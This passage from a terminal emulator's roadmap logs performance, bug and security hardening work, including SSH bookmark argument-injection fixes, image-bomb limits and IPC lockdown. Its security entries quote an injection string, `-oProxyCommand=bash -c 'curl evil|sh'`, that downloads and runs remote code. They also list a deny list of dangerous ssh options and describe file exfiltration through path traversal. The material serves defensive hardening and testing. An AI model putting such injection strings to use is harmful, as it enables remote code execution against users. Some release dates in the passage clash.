  checklist. See [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Upgrade `actions/checkout` to v5 (Node.js 24).** Shipped in
  0.7.0. Both `.github/workflows/ci.yml` pin sites bumped to
  `actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd  # v5.0.1`
  (v5.0.0 and v5.0.1 both resolve to the same SHA; v5.0.1 is the
  currently-latest patch). Landed in commit `aad4f32`. Input surface
  is stable across v4→v5 — no workflow changes required. See
  [CHANGELOG.md §0.7.0](CHANGELOG.md#070--2026-04-19).

## 0.7.7 — hardening pass — shipped 2026-04-15

**Theme:** four-dimensional review (perf / security / bugs / refactor)
commissioned 2026-04-22 across the full codebase. Findings triaged into
three cohorts — **(A) shipped in-tree in this release** (the small,
verified, low-blast-radius fixes that went in before this ROADMAP update
so 0.7.7 has real content), **(B) 0.7.7 planned work** (medium-scope,
self-contained), and **(C) deferred to 0.8+** (large refactors and
architecture-level perf work that deserves its own release arc). Each
item carries the dimension tag (⚡ perf, 🔒 security, 🐛 bug,
🧹 refactor) so the release notes can group them.

### 🐛 / 🔒 — Shipped alongside this ROADMAP revision

- ✅ **🐛 `insertLines` / `deleteLines` now sync `m_screenHyperlinks`.**
  Was: CSI L / CSI M shifted `m_screenLines` rows without moving the
  parallel OSC 8 hyperlink table, so clickable spans drifted away from
  the cells containing the link text after any `vim :delete` /
  `:insert` burst. Now: the same erase/insert pattern runs against
  `m_screenHyperlinks`, gated on `bottom < m_screenHyperlinks.size()`
  so under-populated tables (lazy-grow path at
  `TerminalGrid::addRowHyperlink`) don't throw.
  Fix in `src/terminalgrid.cpp` (insertLines/deleteLines bodies).
- ✅ **🐛 Resize clamps `m_hyperlinkStartRow` / `m_hyperlinkStartCol`.**
  Was: shrinking the grid below the row where an OSC 8 was opened left
  the start coordinates pointing at a no-longer-existent row — a later
  grow-back would attach the span to a row whose content no longer
  matched. Now: both fields are `std::clamp`'d on every resize, same
  as `m_cursorRow/Col`.
- ✅ **🔒 SSH bookmark argv-injection hardening (CVE-2017-1000117
  class).** `SshBookmark::toSshCommand` now inserts `--` before the
  host argument, stopping OpenSSH from parsing a host whose value
  begins with `-` as an option (classic
  `-oProxyCommand=bash -c 'curl evil|sh'` trick). Shell-quoting alone
  does not defend against this — the shell passes the value correctly
  but `ssh` itself then re-interprets the leading dash.
- ✅ **🔒 Image-bomb defence: PNG dimension peek before decode.** Both
  decode sites (OSC 1337 iTerm2 and Kitty graphics PNG path) now use
  `QImageReader::size()` to read the PNG header and reject images
  declaring dimensions over `MAX_IMAGE_DIM` (4096) *before* calling
  `QImage::loadFromData`. Prevents a 1 KB compressed PNG declaring
  100 000 × 100 000 from forcing a multi-GB decompression allocation
  in the millisecond window before the post-decode dimension guard
  fires. Follows the
  [Qt6 untrusted-data guidance](https://doc.qt.io/qt-6/untrusteddata.html).
- ✅ **🔒 OSC/DCS/APC buffer memory release after dispatch.** Was: an
  attacker who streamed a ~10 MB inline image left three 10 MB
  `std::string` buffers sitting at full capacity in the VtParser for
  the lifetime of the process (30 MB permanent overhead per terminal),
  because `.clear()` doesn't shrink. Now: dispatch does
  `std::move` into the `VtAction`, then a `releaseIfLarge` helper
  swap-deallocates when capacity exceeds 64 KB. Normal-traffic buffers
  stay cheap; adversarial ones don't linger.

### 🐛 / ⚡ / 🧹 — Shipped in the 0.7.7 planned-work pass

- ✅ **🐛 Audit-pipeline regression coverage for the 0.7.7 hardening fixes.**
  Four new `tests/features/` subtrees lock the 0.7.6 → 0.7.7 fixes with
  the same "fails on pre-fix code" guarantee the rest of the feature
  suite carries:
  - `osc8_insert_delete_lines/` — feeds OSC 8 at row 5, issues CSI 2 L
    from cursor row 2, asserts the span now lives at row 7. Pre-fix,
    the span stayed on row 5 because `m_screenHyperlinks` was never
    shifted.
  - `hyperlink_resize_clamp/` — opens an OSC 8 at (20, 50), shrinks to
    (5, 10), closes with OSC 8 close, asserts the span lands on a row
    in `[0, 4]`. Pre-fix, the close site's upper-bound guard silently
    dropped the span because `m_hyperlinkStartRow` still held 20.
  - `ssh_dash_host_rejected/` — constructs `SshBookmark` in five
    scenarios (plain, user@host, identity+port, extraArgs, malicious
    `-oProxyCommand=evil`) and asserts every command contains ` -- `
    before the host token. Catches any future refactor that drops the
    argv terminator.
  - `image_bomb_png_header_peek/` — static source inspection of
    `src/terminalgrid.cpp`: every `loadFromData(...)` call must be
    preceded by a `QImageReader` peek in the 10 lines above or carry a
    `// image-peek-ok` marker. Runtime fuzz would either succeed
    (no signal) or hang CI (no signal either).
- ✅ **⚡ `isCellSearchMatch` — linear scan → `std::lower_bound`.**
  `m_searchMatches` is sorted by `globalLine`; the binary search jumps
  to the first match ≥ current line, then iterates only matches whose
  `globalLine` equals it. The previous impl self-described as "binary
  search" but walked the whole vector from index 0. Expected win: 5–20%
  of paint time on search-highlighted content.
- ✅ **⚡ `QFontMetrics` hoisted out of the per-cell underline loop.**
  `updateFontMetrics()` now caches `underlinePos` + `lineWidth` into
  `m_fontUnderlinePos` / `m_fontLineWidth` members; the underline
  drawing path reads the members directly. Relevant on TUI apps that
  underline every cell (Claude Code's SGR 4 pattern).
- ✅ **⚡ Selection-bounds normalisation lifted out of `isCellSelected`.**
  `paintEvent` now normalises the selection once per frame into local
  `selLineStart` / `selColStart` / `selLineEnd` / `selColEnd` /
  `selRectColMin` / `selRectColMax`, and uses an inline `cellInSelection`
  lambda that consumes the pre-normalised values. The `isCellSelected`
  method is kept for the other callers (`selectedText` etc.) but the
  hot-path caller no longer re-runs `std::swap` + `std::min`/`std::max`
  for every cell in the frame.
- ✅ **🧹 `setOwnerOnlyPerms` helper (`src/secureio.h`).** The bitmask
  `QFileDevice::ReadOwner | QFileDevice::WriteOwner` was previously
  repeated at 11 call sites across `config.cpp`, `sessionmanager.cpp`
  (×2), `claudeallowlist.cpp`, `auditdialog.cpp` (×4),
  `claudeintegration.cpp` (×2), `remotecontrol.cpp`, and
  `auditrulequality.cpp`. One typo (`ReadOther`, `ReadGroup`) away
  from widening access to a file that may hold an API key. Two-overload
  helper: `setOwnerOnlyPerms(QFileDevice&)` for open handles (QFile /
  QSaveFile) and `setOwnerOnlyPerms(const QString&)` for existing
  paths (socket perms, post-close repairs). Every call site is now
  routed through one of the two. The one surviving 0755 case in
  `settingsdialog.cpp` (hooks shell script — needs executable bit for
  every user role) stays literal by design.
- ✅ **🧹 Shared `shellQuote` helper (`src/shellutils.h`).** Previously
  a static function in `sshdialog.cpp` and *re-defined as a local
  lambda* in `mainwindow.cpp::openClaudeProjectsDialog` — two implem-
  entations of regex-based single-quote-escaping, one that handled
  empty strings / pass-throughs and one that didn't. Consolidated into
  one inline header; both call sites rewritten to use it.

### 💭 0.8+ deferred — larger scope

- ⚖️ **⚡ `scrollUp` / `scrollDown` — erase/insert loop → `std::rotate`
  (investigated 0.7.9, not shipped).** Hot path during every newline
  in a full-window scroll. The theoretical win was "one O(rows) rotate
  instead of a count-length O(rows) loop," but the newline-stream case
  is always `count == 1`, which reduces the old `erase(begin) +
  insert(end)` to one shift + push_back — practically identical to
  `std::rotate(first, first+1, last)`'s save/shift/restore cycle, with
  rotate's save-and-restore costing ~2 extra moves per call. Measured
  on `bench_vt_throughput newline_stream` the rotate path was 12–15%
  **slower** (5.2 → 4.6 MB/s) because rotate paid for the save/restore
  while the blank-overwrite still had to allocate the bottom row.
  The real bottleneck is the per-scroll `makeRow(m_cols, ...)` +
  `vector<Cell>` allocation, plus the heap handoff to scrollback —
  not the container shuffle. A future perf pass should replace the
  scrollback push with a cell-vector swap (keeping the capacity in
  the screen row, transferring only the populated-cell snapshot to
  scrollback) or move to a ring-buffered screen grid. The 0.7.9
  investigation did ship the guard: `tests/features/scroll_region_rotate`
  pins the observable semantics so the next attempt can refactor
  safely.
- ✅ **⚡ Cell-buffer free-list for scroll paths (shipped 0.7.10).**
  Small `m_freeCellBuffers` pool (cap 4 entries) + `takeBlankedCellsRow()`
  / `returnCellsRow()` helpers. `scrollUp`, `scrollDown`, `insertLines`,
  `deleteLines` recycle cell buffers instead of calling `makeRow(m_cols, …)`
  on every scroll. When `m_scrollback` hits capacity and evicts a line,
  its cells vector is salvaged into the pool; the next scroll's new
  bottom row pulls from it, skipping the allocator. Measured
  **+15.8 %** on `bench_vt_throughput newline_stream` (5.26 → 6.09
  MB/s, median of ten-run pairs). Other corpora flat to mildly
  improved; `utf8_cjk` also gained +12 %. First perf result to
  validate the 0.7.9 thesis that the container shuffle was a red
  herring and the allocator was the actual hot spot.
- ✅ **⚡ Per-frame `QString` construction in the text-run accumulator
  (shipped 0.7.9).** `QString::fromUcs4()` used to be called per
  non-space cell in both `TerminalWidget::paintEvent` and
  `GlRenderer::render`; the run was then built via repeated
  `QString::operator+=`. Reworked to accumulate codepoints into a
  reusable `std::vector<char32_t>` on the `Run` struct and call
  `QString::fromUcs4(data, size)` exactly once at run-push time. The
  vector is reused across runs within a frame (cleared on push), so
  steady-state allocation is amortised.
- ✅ **⚡ Combining-char map in-place key remap on `deleteChars` /
  `insertBlanks` (shipped 0.7.11).** Old impl built a new
  `unordered_map` then move-assigned it, re-hashing every surviving
  entry and reallocating buckets. Rewrote to use node-handle
  `extract()` + key-mutate + `insert()`: the map's nodes are detached,
  their integer key field is set to the shifted column, and the nodes
  are reinserted — no bucket reallocation, no re-hashing of the value
  vector. Empty-map fast-path short-circuits the whole block.
  deleteChars sorts shifted keys ascending (leftward shift can't
  collide in ascending order); insertBlanks sorts descending (rightward
  shift can't collide in descending order).
- ⚖️ **🧹 Dialog base class (investigated 0.7.9, rejected).** Only
  `settingsdialog.cpp` and `claudeallowlist.cpp` actually use
  `QDialogButtonBox` with Ok/Apply/Cancel; the other four dialogs
  (`aidialog`, `sshdialog`, `claudeprojects`, `auditdialog`) have
  bespoke button layouts without the triplet pattern. Extracting a
  `DialogBase` with `setupStandardButtons` would save ~10 lines across
  2 call sites — premature abstraction with real regression surface
  (each call site has subtle per-dialog validation / error-hint
  wiring). Deferred unless/until a third dialog needs the pattern.
- ⚖️ **🧹 `ManagedProcess` (investigated 0.7.9, rejected).**
  `auditdialog.cpp` uses a single shared `QProcess` member that runs
  checks serially, not "six copies." The timeout-and-cleanup dance is
  already at one call site. Other files that launch processes
  (`claudeintegration.cpp` for `claude` binary, `ssh` via `Pty`) have
  one-off patterns with no shared structure to extract. Re-file if a
  second generalised process-runner emerges.
- ✅ **🔒 IPC-socket `/tmp` fallback stat-guard (shipped 0.7.11).**
  `remotecontrol.cpp` still defaults to `XDG_RUNTIME_DIR` (correct,
  0700 perms) but now gates every `QLocalServer::removeServer(path)`
  call behind a `lstat()` check. Uses `lstat` (not `stat`) so a
  symlink reports as a symlink and is refused. Requires `S_ISSOCK(mode)`
  AND `st_uid == getuid()`; `ENOENT` passes through (nothing to remove).
  On refusal the remote-control layer disables itself with a clear
  log message instead of unlinking an unknown file.

### ✅ Shipped in 0.7.8 — Fold-in to the project audit tool

Every finding that is expressible as a repo-wide grep / AST pattern
becomes a persistent audit rule — that's how a review turns into a
regression guard instead of a one-off sweep. The 0.7.8 release adds
three new rules so the 0.7.6 / 0.7.7 hardening sweep leaves behind
automation, not just diffs. All three fire cleanly on the current
tree: the shipped fix sites are suppressed by the intended runtime
filter (`<< "--"` guard, `image-peek-ok` tag, `disable-file` on the
helper itself):

- ✅ `ssh_argv_dash_host` (Security, Major) — matches
  `<< shellQuote(...host...)` and drops findings when `<< "--"`
  appears within ±5 lines. Context window is 5 (not 3 as originally
  specced) to span the `if (!user.isEmpty()) / else` split in
  `sshdialog.cpp:67-71`.
- ✅ `qimage_load_without_peek` (Qt, Minor) — matches
  `.loadFromData(` and drops findings tagged `// image-peek-ok` or
  preceded by `QImageReader` within ±5 lines. Two shipped sites in
  `terminalgrid.cpp` carry the reviewer sign-off tag.
- ✅ `setPermissions_pair_no_helper` (Qt, Info) — matches
  `setPermissions(... QFileDevice::ReadOwner | WriteOwner)` and
  nudges toward `setOwnerOnlyPerms()` from `src/secureio.h`. Pattern
  excludes the 0755 hook-script case (extra `|` flags). The helper
  itself is suppressed via `// ants-audit: disable-file`.

See the [feature-coverage audit lane](CHANGELOG.md#076--2026-04-22)
work in 0.7.6 for the precedent of "each review leaves a detector
behind."

## 0.7.12 — independent-review sweep — shipped 2026-04-19

**Theme:** fold-in of the 2026-04-23 multi-agent code review. Fourteen
independent `general-purpose` subagents were dispatched in parallel — one
per subsystem — each briefed only with source paths + contract docs
(`CLAUDE.md`, `PLUGINS.md`, `tests/features/*/spec.md`) and external
standards (ECMA-48, xterm ctlseqs, POSIX `forkpty(3)`, SARIF v2.1.0,
OpenAI API, SSE, Lua 5.4 Reference Manual, OWASP LLM Top 10,
CVE-2017-1000117, OpenGL 3.3). Agents had **zero context on
implementation reasoning** — they reviewed code against contracts, not
against intent. This is the "escape the self-graded-homework bubble"
lane: findings here come from outside the author's head.

The sweep produced ~60 HIGH findings, ~80 Medium, and ~40 Low. This
section tracks the HIGH findings plus cross-cutting themes that were
flagged by multiple independent reviewers. Medium/Low findings are
captured in the review transcripts (commit `<tbd>`) and triaged into
grep rules or individual tickets as they become actionable.

### 📦 Outstanding-item bundle plan (post-0.7.27)

Bump overhead is fixed (CHANGELOG, metainfo XML, debian changelog,
drift check, build, test, commit, tag) — paid once whether the
release contains one fix or four. The remaining 📋 items below are
grouped by **theme + file affinity** so each future bump retires
2-4 related items at once instead of one. Each item still gets its
own `tests/features/<name>/` spec + regression test; the bundle
gets one CHANGELOG section and one drift cycle.

| Bundle | Theme | Items | File affinity |
|--------|-------|-------|---------------|
| **0.7.28** ✅ | Audit pipeline I — process-side robustness | per-tool timeout override · incremental QProcess output drain · distinguish segfault from "no findings" | `auditdialog.cpp` |
| **0.7.29** ✅ | Audit pipeline II — output quality | SARIF `suppressions[]` array emission · regex-DoS watchdog on user `drop_if_matches` · widen `computeDedup` to 96 bits | `auditdialog.cpp` |
| **0.7.30** ✅ | Session-file integrity | SHA-256 payload checksum · pre-validate compressed length prefix before `qUncompress` · `QDataStream::status()` checks inside cell loop | `sessionmanager.cpp` |
| **0.7.31** ✅ | Persistence integrity (cross-file) | silent-data-loss on parse failure (settings-dialog mirror) · `setOwnerOnlyPerms` ordering bugs · concurrent-writer guard on `config.json` + `settings.local.json` · `secureio.h` split | `config.cpp`, `sessionmanager.cpp`, `claudeallowlist.cpp`, `debuglog.cpp`, `settingsdialog.cpp`, `secureio.h` |
| **0.7.32** ✅ | UX bundle (Settings + Review Changes + Tab UX) | dependency-UI enable gating · Cancel rollback for Profiles tab · Restore Defaults per-tab · Review Changes branch awareness · Review Changes live updates (QFileSystemWatcher + Refresh) · always-visible tab × glyph (user feedback) | `settingsdialog.cpp`, `mainwindow.cpp` |
| **0.7.33** ✅ | Lifecycle / cleanup | PTY dtor off-main-thread (last PTY Tier 2 item) · Portal session close · Lua manifest size cap + canonical plugin path | `ptyhandler.cpp`, `globalshortcutsportal.cpp`, `pluginmanager.cpp` |
| **0.7.34** ✅ | Terminal correctness | origin-mode translate on CUP/HVP/VPA · DECSTBM origin-aware home · DECSC saves DECOM + DECAWM (real tmux/screen breakage) | `terminalgrid.cpp` |

**Standalone items (don't bundle):**
- `VtBatch` zero-copy across thread hop (`vtstream.h`) — perf; pair
  with the 0.8.x perf work in § 0.8.0 ⚡ Performance instead.
- ✅ Renderer subsystem decision — resolved 0.7.44 (deleted
  `glrenderer.cpp`; QPainter+QTextLayout is the sole render path).
  See entry below.

**0.8.x external-signal CI lanes (separate phase):**
- vttest as CI lane · differential screen-dump harness vs xterm/kitty
  · libFuzzer target against `VtParser` · real-TUI smoke lane.
  These are CI-infrastructure work, not in-tree fixes; track as a
  cluster under § 0.8.x dev experience.

The Settings dialog Tier 3 items (dependency-UI gating, Cancel
rollback, Restore Defaults) are mirrored at L1544-1551 below; that
list stays as the canonical location and 0.7.32 pulls from it. The
bundle table above is an index, not a duplication.

Picking the **next** bundle is mechanical: take the lowest-numbered
release whose items are all still 📋 in the source-of-truth list
below. If a referenced item turns ✅ between bumps, the bundle
shrinks; if a new item appears mid-stream that fits an existing
bundle's theme, fold it in rather than spinning up a new release.

### 🔥 Cross-cutting themes (patterns caught by ≥2 reviewers)

- ✅ **Silent-data-loss on parse failure.** Shipped 0.7.12 in
  `config.cpp` + `claudeallowlist.cpp` + `settingsdialog.cpp`
  (refuse-to-save + `rotateCorruptFileAside` shared helper).
  Behavioural test coverage extended to the allowlist + settings-
  dialog mirror sites in 0.7.31 via
  `tests/features/settings_parse_failure_mirror/`. Cross-cutting
  pattern fully retired.
- ✅ **`/tmp/*.js` TOCTOU via predictable filenames.** Shipped 0.7.12
  (Tier 1 batch). All three KWin script paths
  (`xcbpositiontracker.cpp`, `mainwindow.cpp` twice) migrated from
  predictable `/tmp/kwin_*.js` filenames to `QTemporaryFile` with
  `setAutoRemove(false)`; the async dbus-send chain removes the file
  after use. Closes the same-UID symlink-swap TOCTOU + same-name
  collision between Ants instances. Orphan-cleanup sweep added 0.7.15
  (`MainWindow` ctor runs `sweepKwinScriptOrphansOnce()` for stale
  files older than 1 hour, guarded by a `static bool` so a second
  MainWindow doesn't re-sweep).
- ✅ **`setOwnerOnlyPerms` ordering bugs.** Shipped 0.7.31. Every
  persistence site that did fd-only chmod now also re-chmods the
  final inode after rename / commit succeeds — `Config::save`,
  `SessionManager::saveSession`, `SessionManager::saveTabOrder`,
  `SettingsDialog::installClaudeHooks`,
  `SettingsDialog::installClaudeGitContextHook`. The rename-fallback
  path on FAT/exFAT/SMB/NFS/copy-unlink filesystems would otherwise
  leak ai_api_key (config.json), bearer tokens (settings.json), or
  paste-buffer scrollback (session_*.dat) at 0644. `debuglog.cpp`
  was already covered in 0.7.20. `claudeallowlist.cpp` was already
  covered in 0.7.17. Locked by
  `tests/features/persistence_post_rename_chmod/` — 10 invariants
  spanning the three remaining persistence files.
- ✅ **"Documented feature, dead code" drift** — 5 distinct cases caught
  by 4 different reviewers, now all resolved:
  - `gpu_rendering` / partial-update spec: spec.md rewritten in
    [Unreleased] to match the live QWidget-base test; directory name
    kept for CMake stability. `gpu_rendering` config key retained
    because `glrenderer` is reachable via the optional container path
    (ROADMAP Tier 3 revive-or-delete decision is separate tracking).
  - `background_alpha` config key + getter/setter + member **removed**
    in [Unreleased] — redundant with `opacity`, which is what the user
    actually sets. Paint path at `terminalwidget.cpp:605` remains
    unchanged (uses `m_windowOpacity`, driven by `opacity` config).
  - Claude plan-mode `value("mode")` → `permissionMode` fix shipped
    in 0.7.12.
  - `session_persistence` default doc drift corrected in README
    ([Unreleased]); code default was right.
  - `font_size` range doc drift corrected in README ([Unreleased]);
    code range (4–48) was right.
- ✅ **No-auth local IPC is a UID-scope RCE chain.** Shipped 0.7.12
  (Tier 1 batch). `remote_control_enabled` config key added (default
  `false`, matching Kitty's `allow_remote_control=no`); MainWindow
  gates the listener's `start()` on this key. `send-text` request
  payloads pass through `RemoteControl::filterControlChars` which
  strips `{0x00..0x08, 0x0B..0x1F, 0x7F}` while preserving HT/LF/CR
  and all UTF-8 bytes >= 0x80. Callers needing raw byte pass-through
  set `"raw": true` in the request JSON. Closes the UID-scope
  keystroke-injection RCE chain. Hardened further 0.7.12 by caching
  the gate decision at process start (`mainwindow.cpp:799`
  `static const bool remoteControlGate = …`) so a second MainWindow
  doesn't re-read the flag. Locked by
  `tests/features/remote_control_opt_in/` (config round-trip
  assertion + structural check that `start()` lives inside a
  conditional). X25519 auth work for opt-in users tracked separately.

### 🔒 Tier 1 — ship-this-week fixes (security/data-loss blockers)

- ✅ **`permissionMode` field-name typo.** `claudeintegration.cpp:495`
  read `value("mode")`; real Claude Code JSONL (verified against live
  `~/.claude/projects/*.jsonl` at v2.1.87) uses `permissionMode`.
  Fixed; `planModeChanged(true)` now actually fires on plan-mode entry.
  Regression test anchored to real JSONL schema:
  `tests/features/claude_plan_mode_detection/`.
- ✅ **Remote-control opt-in default + `send-text` control-char filter.**
  Added `remote_control_enabled` config key (default `false`, matches
  Kitty `allow_remote_control=no`). The MainWindow now gates the
  listener's `start()` on this key. `send-text` request payloads pass
  through `RemoteControl::filterControlChars` which strips
  `{0x00..0x08, 0x0B..0x1F, 0x7F}` while preserving HT/LF/CR and all
  UTF-8 bytes >= 0x80. Callers needing raw byte pass-through set
  `"raw": true` in the request JSON. Closes the UID-scope keystroke-
  injection RCE chain. Regression test:
  `tests/features/remote_control_opt_in/`.
- ✅ **Parse-failure-overwrites-data — Config + Allowlist + shared
  helper.** `Config::load()` now distinguishes fresh-run / valid /
  corrupt. On corrupt, the on-disk file is rotated to
  `config.json.corrupt-<ms_timestamp>[-N]` via the new shared
  `rotateCorruptFileAside()` helper (secureio.h) with a
  collision-retry loop up to 10 attempts (addresses the /indie-review
  same-second-collision HIGH finding). `m_loadFailed` is latched;
  `save()` is a no-op for the session so setters can't destroy the
  user's hand-fixable bytes. Separate log messages for success vs
  failed backup.
  `ClaudeAllowlistDialog::saveSettings()` adopts the same pattern:
  parse failure refuses to save rather than destroying the non-
  permissions keys (model, editor prefs, custom hooks).
  `SessionManager` verified as already-defended — its per-tab files
  use granular `QDataStream::status()` checks at every read, and
  failure returns false without clobbering the file.
  Regression test: `tests/features/config_parse_failure_guard/`
  (behavioral: plants a corrupt file, asserts setter doesn't
  overwrite).
- ✅ **`std::rename` return checked + errno logged.** `config.cpp`
  save path: rename failure logs errno via
  `ANTS_LOG(DebugLog::Config, ...)` and removes the orphan tmp file.
  `.bak` rotation subsumed by the parse-failure backup above.
- ✅ **SSH bookmark `extraArgs` ProxyCommand/LocalCommand rejection.**
  `SshBookmark::sanitizeExtraArgs` filters `-oProxyCommand=`,
  `-oLocalCommand=`, `-oPermitLocalCommand=` in both the
  single-token and space-separated forms (case-insensitive per
  OpenSSH's own option parser). Closes the CVE-2017-1000117-adjacent
  RCE-via-bookmark-field vector. Regression test:
  `tests/features/ssh_extra_args_sanitize/` (20 assertions covering
  both forms, case variants, end-to-end `toSshCommand`).
- ✅ **`/tmp/kwin_*.js` → `QTemporaryFile`.** Three callsites
  (`xcbpositiontracker.cpp`, `mainwindow.cpp` twice) migrated from
  predictable filenames to unpredictable `QTemporaryFile` with
  `setAutoRemove(false)` (the async dbus-send chain removes the file
  after use). Closes the same-UID symlink-swap TOCTOU + same-name
  collision between Ants instances.
- ✅ **Audit rule-pack `command` trust gate.** `loadUserRules()` now
  skips rules with a `command` field unless
  `Config::auditTrustCommandRules() == true` or
  `ANTS_AUDIT_TRUST_UNSAFE=1` is set. Default false — a cloned-but-
  untrusted project can no longer run arbitrary bash via
  `audit_rules.json`. Existing users who relied on command-rules
  opt in via config or env var; warning log surfaces the count of
  skipped rules at load time. Per-project hash-based trust store
  deferred to 0.7.13.
- ✅ **AI `insertCommand` prompt-injection mitigation.**
  `AiDialog::extractAndSanitizeCommand` (new static helper) strips
  C0 controls `{0x00..0x08, 0x0B..0x1F, 0x7F}` from the AI-suggested
  command while preserving HT/LF/CR + UTF-8 multi-byte, caps length
  at 4 KiB. The click handler now requires explicit user
  confirmation via a `QMessageBox::question` showing the literal
  bytes (with a "N bytes were filtered" note when non-zero) before
  emitting `insertCommand`. OWASP LLM01+LLM02 mitigation.
  Regression test: `tests/features/ai_insert_command_sanitize/`
  (18 assertions, behavioral + source-grep on the confirm-before-
  emit invariant).
- ✅ **Audit user-glob path canonicalization.** Shipped 0.7.20.
  New `AuditDialog::resolveProjectPath` helper runs
  `QFileInfo::canonicalFilePath` (resolves both `..` components and
  symlinks) and requires the canonical result to sit under the
  canonical project root with an anchored-slash prefix so sibling
  directories sharing a name prefix can't escape. Six call sites
  migrated from raw `m_projectPath + "/" + f.file` concat:
  `dropFindingsInCommentsOrStrings`, `inlineSuppressed`, the
  enrichment pass (snippet preview + blame), single- and batch-
  AI-triage snippet fallbacks, and the `dropIfContextContains`
  regex-capture file read. Closes the OWASP-LLM06 exfiltration
  surface where a malicious user rule could POST `/etc/passwd` (or
  any UID-readable file) to the configured /v1/chat/completions
  endpoint wrapped in a "review this snippet" prompt. Regression
  test: `tests/features/audit_path_traversal/` — 5 invariants
  behavioral (literal `../`, symlink escape, in-project accept,
  non-existent, empty-input) plus source-grep on auditdialog.cpp
  confirming call-site migration + helper structure
  (canonicalFilePath + anchored startsWith).
- ✅ **Allowlist `QSaveFile` perms belt-and-suspenders.** Shipped in
  [Unreleased]. `ClaudeAllowlistDialog::saveSettings()` now calls
  `setOwnerOnlyPerms(m_settingsPath)` after `file.commit()` succeeds,
  gated on `if (!file.commit()) return false;` so a failed commit
  can't chmod a path that may not exist. The pre-commit fd-level
  `setOwnerOnlyPerms(file)` is retained — both are needed (neither
  subsumes the other). Closes the FAT/exFAT/SMB/NFS/copy-unlink-
  fallback window where the final file could land at the process
  umask (typically 0644) even though the temp fd was 0600; relevant
  because `settings.local.json` can hold Claude Code bearer tokens.
  Locked by `tests/features/allowlist_perms_postcommit` (runtime
  stat check plus source-grep that both chmod calls remain and the
  post-commit call is sequenced after the commit-success gate).

### 🔒 Tier 2 — hardening sweep

- ✅ **PTY `closefrom` replacement.** Shipped 0.7.27. `Pty::start`
  now issues `::syscall(SYS_close_range, 3, ~0U, 0)` first
  (single signal-safe syscall on Linux 5.9+, atomic over the whole
  range, ignores the soft cap), with a `getrlimit(RLIMIT_NOFILE)`-
  bounded fallback when the syscall is unavailable. Fallback bound
  is capped at 65536 to avoid the unbounded-loop pathology on
  hardened-server profiles where `rlim_cur` is in the hundreds of
  thousands. The previous hard-coded `fd<1024` loop silently
  leaked descriptors above 1023 on systemd / container default
  `RLIMIT_NOFILE` profiles — Qt display socket, D-Bus session,
  plugin HTTP, Lua eventfds, remote-control IPC. Locked by
  `tests/features/pty_closefrom` (5 invariants — close_range
  reference, no fd<1024 loop, RLIMIT_NOFILE consulted, headers
  included, 65536 sanity cap). Pre-fix source fails 4 of 5;
  post-fix all 5 pass.
- ✅ **Process-wide `signal(SIGPIPE, SIG_IGN)` in `main.cpp`.** Shipped
  0.6.28 (bc97485) but never regression-tested. Locked 0.7.17 via
  `tests/features/sigpipe_ignore` (source-grep invariants: the call
  exists, appears before `QApplication` construction, `<csignal>` is
  included).
- ✅ **PTY write EAGAIN queue.** Shipped 0.7.27. `Pty::write` now
  branches on `EAGAIN`/`EWOULDBLOCK` distinctly from fatal errors,
  copies the unwritten remainder into a new `m_pendingWrite` queue,
  and enables a `QSocketNotifier(QSocketNotifier::Write)` (created
  disabled in `Pty::start` because PTY masters are writable nearly
  continuously). New `Pty::onWriteReady` slot drains the queue when
  the kernel signals writability and disables the notifier on
  completion. FIFO ordering preserved — a fresh `write()` while
  the queue is non-empty appends rather than bypass. Queue capped at
  4 MiB (`MAX_PENDING_WRITE_BYTES`) so a permanently-stuck slave
  cannot OOM the GUI process. Locked by
  `tests/features/pty_write_eagain_queue` (7 invariants — write-
  notifier created, queue + notifier members declared, slot declared
  and connected, EAGAIN handled distinctly, 4 MiB cap, FIFO check).
  Pre-fix source fails 5 of 7; post-fix all 7 pass.
- ✅ **PTY dtor off-main-thread.** Shipped 0.7.33. The
  `Pty::~Pty` destructor now spawns a detached `std::thread` for
  the SIGTERM/SIGKILL escalation, with the cheap pre-escalation
  reap (SIGHUP + close fd + `waitpid(WNOHANG)`) staying on the
  calling thread so well-behaved children don't pay a thread
  spawn. Pid captured by value; `try { ... }.detach()` wrapped
  in a `catch (const std::system_error &)` that falls back to
  the synchronous escalation when thread creation fails. Pre-fix
  N split panes closing together blocked the GUI N×500 ms;
  post-fix it's microseconds per pane regardless of how
  stubborn the children are. Locked by
  `tests/features/pty_dtor_off_main_thread/` — 11 invariants on
  `<thread>` include, dtor body shape, lambda capture list, and
  fallback retention.
- ✅ **RIS (`ESC c`) preserves all integration callbacks.** Shipped
  0.7.17. The reset handler now stashes + restores 8 callbacks
  (`response`, `bell`, `notify`, `lineCompletion`, `progress`,
  `commandFinished`, `userVar`, `osc133Forgery`) plus `m_osc133Key`.
  Security-relevant: previously a well-timed `tput reset` silenced
  the OSC 133 forgery alarm permanently. Locked by
  `tests/features/ris_preserves_callbacks` (all 8 callbacks fire
  pre-RIS, fire again post-RIS; key survives; grid state actually
  reset).
- ✅ **Origin-mode translate on CUP / DECSC save origin.** Shipped
  0.7.34. `TerminalGrid::handleCsi` (`terminalgrid.cpp`) now
  translates the row argument of CUP, HVP, and VPA through the
  active DECSTBM scroll region when DECOM is set (previously CUP
  jumped to absolute rows under origin mode). DECSTBM home rebases
  on the region top with the same translation. DECSC additionally
  saves DECOM + DECAWM into the cursor-save record so DECRC
  restores the full mode set — pre-fix tmux/screen save-restore
  round-trips silently dropped the flags. Locked by
  `tests/features/origin_mode_correctness/` (7 invariants over
  CUP/HVP/VPA translation, DECSTBM home, and DECSC/DECRC
  round-trip).
- ✅ **OSC 8 URI cap + Kitty APC `m_kittyChunkBuffer` cap.** Shipped
  0.7.25. `TerminalGrid::MAX_OSC8_URI_BYTES = 2048` rejects the open
  of any OSC 8 hyperlink whose URI exceeds 2 KiB (following text
  prints unlinked — same drop path as the invalid-scheme branch).
  `MAX_KITTY_CHUNK_BYTES = 32 MiB` caps the APC chunk-accumulation
  buffer used across `m=1` frames; past the cap the staged bytes are
  dropped + `shrink_to_fit`'d and subsequent `m=0` closes see an empty
  buffer. Previously both accumulators were bounded only by the VT
  parser's per-envelope 10 MB ceiling, so hostile terminal output
  could wedge tens of GB into per-row hyperlink spans / scrollback
  or into the staging buffer before any downstream guard ran.
  Regression test: `tests/features/osc8_apc_memory_caps/` (5
  invariants — happy path, oversized-drop, at-cap-accepted, APC
  single-frame, APC overflow-dropped). Pre-fix source fails
  INV-OSC8-B and INV-APC-B; post-fix all 5 pass.
